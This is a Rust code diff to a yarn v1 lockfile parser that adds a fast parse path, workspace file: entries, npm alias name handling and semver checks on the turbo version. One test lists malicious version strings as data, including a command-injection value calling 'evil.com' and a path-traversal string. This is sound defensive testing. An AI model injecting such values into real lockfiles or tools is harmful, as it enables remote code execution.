@@ -1,10 +1,12 @@
 use std::{any::Any, str::FromStr};
 
+use semver::Version;
 use serde::Deserialize;
 
 use crate::Lockfile;
 
 mod de;
+mod fast_parse;
 mod ser;
 
 type Map<K, V> = std::collections::BTreeMap<K, V>;
@@ -48,6 +50,13 @@ impl FromStr for Yarn1Lockfile {
     type Err = super::Error;
 
     fn from_str(s: &str) -> Result<Self, Self::Err> {
+        // Single-pass fast path for the machine-generated subset; the nom
+        // parser below is the parser of record and handles everything the
+        // fast path declines.
+        if let Some(inner) = fast_parse::parse(s) {
+            return Ok(Self { inner });
+        }
+        tracing::debug!("yarn1 fast parse declined, using general parser");
         let value = de::parse_syml(s)?;
         let inner = serde_json::from_value(value)?;
         Ok(Self { inner })
@@ -78,21 +87,28 @@ impl Lockfile for Yarn1Lockfile {
     fn all_dependencies(
         &self,
         key: &str,
-    ) -> Result<Option<std::collections::HashMap<String, String>>, crate::Error> {
+    ) -> Result<
+        Option<std::borrow::Cow<'_, std::collections::BTreeMap<String, String>>>,
+        crate::Error,
+    > {
         let Some(entry) = self.inner.get(key) else {
             return Ok(None);
         };
 
-        let all_deps: std::collections::HashMap<_, _> = entry.dependency_entries().collect();
+        let all_deps: std::collections::BTreeMap<_, _> = entry.dependency_entries().collect();
         Ok(match all_deps.is_empty() {
-            false => Some(all_deps),
+            false => Some(std::borrow::Cow::Owned(all_deps)),
             true => None,
         })
     }
 
+    fn transitive_edge_resolver(&self) -> Option<Box<dyn crate::TransitiveEdgeResolver + '_>> {
+        Some(Box::new(Yarn1EdgeResolver { lockfile: self }))
+    }
+
     fn subgraph(
         &self,
-        _workspace_packages: &[String],
+        workspace_packages: &[String],
         packages: &[String],
     ) -> Result<Box<dyn Lockfile>, super::Error> {
         let mut inner = Map::new();
@@ -102,6 +118,23 @@ impl Lockfile for Yarn1Lockfile {
             Some((key, entry))
         }) {
             inner.insert(key.clone(), entry.clone());
+        }
+
+        // Yarn v1 creates lockfile entries for `file:` protocol dependencies
+        // that point to workspace packages. These are classified as internal
+        // by the dependency splitter and therefore not included in `packages`,
+        // but they must be present in the pruned lockfile for
+        // `yarn install --frozen-lockfile` to succeed.
+        for (key, entry) in &self.inner {
+            if let Some(file_path) = extract_file_path(key) {
+                let normalized = file_path.strip_prefix("./").unwrap_or(file_path);
+                if workspace_packages
+                    .iter()
+                    .any(|wp| normalized == wp || normalized.ends_with(&format!("/{wp}")))
+                {
+                    inner.insert(key.clone(), entry.clone());
+                }
+            }
         }
 
         Ok(Box::new(Self { inner }))
@@ -125,14 +158,56 @@ impl Lockfile for Yarn1Lockfile {
         // not supported.
         let key = self.inner.keys().find(|key| key.starts_with("turbo@"))?;
         let entry = self.inner.get(key)?;
-        Some(entry.version.clone())
+        let version = &entry.version;
+        Version::parse(version).ok()?;
+        Some(version.clone())
     }
 
     fn human_name(&self, package: &crate::Package) -> Option<String> {
         let entry = self.inner.get(&package.key)?;
-        let name = entry.name.as_deref()?;
+        let name = entry
+            .name
+            .as_deref()
+            .or_else(|| npm_alias_target_from_key(&package.key))
+            .or_else(|| package_name_from_key(&package.key))?;
         let version = &entry.version;
         Some(format!("{name}@{version}"))
+    }
+
+    fn package_source(&self, package: &crate::Package) -> crate::PackageSource {
+        let Some(entry) = self.inner.get(&package.key) else {
+            return crate::PackageSource::Registry;
+        };
+        entry
+            .resolved
+            .as_deref()
+            .map(crate::package_source_from_identifier)
+            .unwrap_or_else(|| crate::package_source_from_identifier(&package.key))
+    }
+
+    fn format_version(&self) -> Option<String> {
+        Some("1".to_string())
+    }
+}
+
+/// Proves per-edge workspace independence for the shared closure DP.
+///
+/// yarn1 resolution never consults the workspace: `resolve_package` ignores
+/// its workspace argument entirely and resolves purely from the lockfile's
+/// `name@specifier` keys, so every edge is globally uniform by construction.
+struct Yarn1EdgeResolver<'a> {
+    lockfile: &'a Yarn1Lockfile,
+}
+
+impl crate::TransitiveEdgeResolver for Yarn1EdgeResolver<'_> {
+    fn resolve_edge(
+        &self,
+        name: &str,
+        version: &str,
+    ) -> Result<crate::TransitiveEdgeResolution, crate::Error> {
+        Ok(crate::TransitiveEdgeResolution::Global(
+            self.lockfile.resolve_package("", name, version)?,
+        ))
     }
 }
 
@@ -154,6 +229,17 @@ impl Entry {
 
 const PROTOCOLS: &[&str] = ["", "npm:", "file:", "workspace:", "yarn:"].as_slice();
 
+/// Extracts the file path from a yarn1 lockfile key like
+/// `@scope/pkg@file:./packages/foo`. Returns `None` if the key doesn't use
+/// the `file:` protocol.
+fn extract_file_path(key: &str) -> Option<&str> {
+    // Keys look like `name@file:path` or `name@npm:version`.
+    // The name may be scoped (`@scope/pkg@file:path`) so we find `@file:`
+    // anywhere after the first character.
+    let idx = key[1..].find("@file:")? + 1;
+    Some(&key[idx + "@file:".len()..])
+}
+
 fn possible_keys<'a>(name: &'a str, version: &'a str) -> impl Iterator<Item = String> + 'a {
     PROTOCOLS
         .iter()
@@ -161,45 +247,174 @@ fn possible_keys<'a>(name: &'a str, version: &'a str) -> impl Iterator<Item = St
         .map(move |protocol| format!("{name}@{protocol}{version}"))
 }
 
+fn package_name_from_key(key: &str) -> Option<&str> {
+    let search_start = usize::from(key.starts_with('@'));
+    let delimiter = key[search_start..].find('@')? + search_start;
+    Some(&key[..delimiter])
+}
+
+fn npm_alias_target_from_key(key: &str) -> Option<&str> {
+    // Yarn Classic does not persist a `name` field for npm aliases. Recover
+    // the actual package name from `alias@npm:package@version`. A regular
+    // `package@npm:version` descriptor has no second package name and falls
+    // through to `package_name_from_key`.
+    let descriptor = key.split(',').next()?.trim();
+    let target = descriptor.split_once("@npm:")?.1;
+    package_name_from_key(target)
+}
+
 #[cfg(test)]
 mod test {
-    use pretty_assertions::assert_eq;
-    use test_case::test_case;
-
     use super::*;
 
-    const MINIMAL: &str = include_str!("../../fixtures/yarn1.lock");
-    const FULL: &str = include_str!("../../fixtures/yarn1full.lock");
-    const GH_8849: &str = include_str!("../../fixtures/gh_8849.lock");
-
-    #[test_case(MINIMAL ; "minimal lockfile")]
-    #[test_case(FULL ; "full lockfile")]
-    #[test_case(GH_8849 ; "gh 8849")]
-    fn test_roundtrip(input: &str) {
-        let lockfile = Yarn1Lockfile::from_str(input).unwrap();
-        assert_eq!(input, lockfile.to_string());
+    #[test]
+    fn test_extract_file_path() {
+        assert_eq!(
+            extract_file_path("@hardfin/eslint-config@file:./packages/eslint-config"),
+            Some("./packages/eslint-config")
+        );
+        assert_eq!(
+            extract_file_path("my-pkg@file:packages/foo"),
+            Some("packages/foo")
+        );
+        assert_eq!(extract_file_path("lodash@^4.17.21"), None);
+        assert_eq!(extract_file_path("@scope/pkg@npm:1.0.0"), None);
     }
 
     #[test]
-    fn test_key_splitting() {
-        let lockfile = Yarn1Lockfile::from_str(FULL).unwrap();
-        for key in [
-            "@babel/types@^7.18.10",
-            "@babel/types@^7.18.6",
-            "@babel/types@^7.19.0",
-        ] {
-            assert!(
-                lockfile.inner.contains_key(key),
-                "missing {} in lockfile",
-                key
-            );
-        }
+    fn test_human_name_uses_resolved_version() {
+        let lockfile = Yarn1Lockfile::from_str(
+            r#"# yarn lockfile v1
+
+lodash@^4.17.21:
+  version "4.17.21"
+
+"@scope/pkg@npm:^1.0.0":
+  version "1.2.3"
+"#,
+        )
+        .unwrap();
+
+        assert_eq!(
+            lockfile.human_name(&crate::Package {
+                key: "lodash@^4.17.21".to_string(),
+                version: "4.17.21".to_string(),
+            }),
+            Some("lodash@4.17.21".to_string())
+        );
+        assert_eq!(
+            lockfile.human_name(&crate::Package {
+                key: "@scope/pkg@npm:^1.0.0".to_string(),
+                version: "1.2.3".to_string(),
+            }),
+            Some("@scope/pkg@1.2.3".to_string())
+        );
     }
 
-    #[test_case(MINIMAL, "1.9.3" ; "minimal lockfile")]
-    #[test_case(FULL, "1.4.6" ; "full lockfile")]
-    fn test_turbo_version(lockfile: &str, expected: &str) {
-        let lockfile = Yarn1Lockfile::from_str(lockfile).unwrap();
-        assert_eq!(lockfile.turbo_version().as_deref(), Some(expected));
+    #[test]
+    fn test_human_name_uses_npm_alias_target() {
+        let lockfile = Yarn1Lockfile::from_str(
+            r#"# yarn lockfile v1
+
+"alias@npm:JSONStream@1.0.0":
+  version "1.0.0"
+
+"scoped-alias@npm:@scope/package@2.0.0":
+  version "2.0.0"
+"#,
+        )
+        .unwrap();
+
+        assert_eq!(
+            lockfile.human_name(&crate::Package {
+                key: "alias@npm:JSONStream@1.0.0".to_string(),
+                version: "1.0.0".to_string(),
+            }),
+            Some("JSONStream@1.0.0".to_string())
+        );
+        assert_eq!(
+            lockfile.human_name(&crate::Package {
+                key: "scoped-alias@npm:@scope/package@2.0.0".to_string(),
+                version: "2.0.0".to_string(),
+            }),
+            Some("@scope/package@2.0.0".to_string())
+        );
+    }
+
+    #[test]
+    fn test_subgraph_includes_file_deps_for_workspaces() {
+        // Reproduces https://github.com/vercel/turborepo/issues/4105
+        // file: dependencies pointing to workspace packages must appear in
+        // the pruned lockfile even though they are classified as internal.
+        let lockfile_content = r#"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
+# yarn lockfile v1
+
+
+"@repo/eslint-config@file:./packages/eslint-config":
+  version "0.0.0"
+  dependencies:
+    eslint-config-prettier "8.6.0"
+
+eslint-config-prettier@8.6.0:
+  version "8.6.0"
+  resolved "https://registry.yarnpkg.com/eslint-config-prettier/-/eslint-config-prettier-8.6.0.tgz"
+  integrity sha512-abc
+
+is-odd@^3.0.1:
+  version "3.0.1"
+  resolved "https://registry.yarnpkg.com/is-odd/-/is-odd-3.0.1.tgz"
+  integrity sha512-def
+"#;
+        let lockfile = Yarn1Lockfile::from_str(lockfile_content).unwrap();
+
+        // The transitive closure only contains the normal package — the file:
+        // dep was classified as internal so it won't be in `packages`.
+        let packages = vec!["is-odd@^3.0.1".to_string()];
+        let workspace_packages = vec!["packages/eslint-config".to_string()];
+
+        let pruned = lockfile.subgraph(&workspace_packages, &packages).unwrap();
+        let encoded = String::from_utf8(pruned.encode().unwrap()).unwrap();
+
+        assert!(
+            encoded.contains("@repo/eslint-config@file:./packages/eslint-config"),
+            "pruned lockfile must include file: entry for workspace package"
+        );
+        assert!(
+            encoded.contains("is-odd@^3.0.1"),
+            "pruned lockfile must include normal packages"
+        );
+    }
+
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            let lockfile_content = format!(
+                r#"# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.
+# yarn lockfile v1
+
+
+turbo@^1.0.0:
+  version "{malicious_version}"
+  resolved "https://registry.yarnpkg.com/turbo/-/turbo-1.0.0.tgz#abc123"
+"#
+            );
+            let lockfile = Yarn1Lockfile::from_str(&lockfile_content).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
+        }
     }
 }
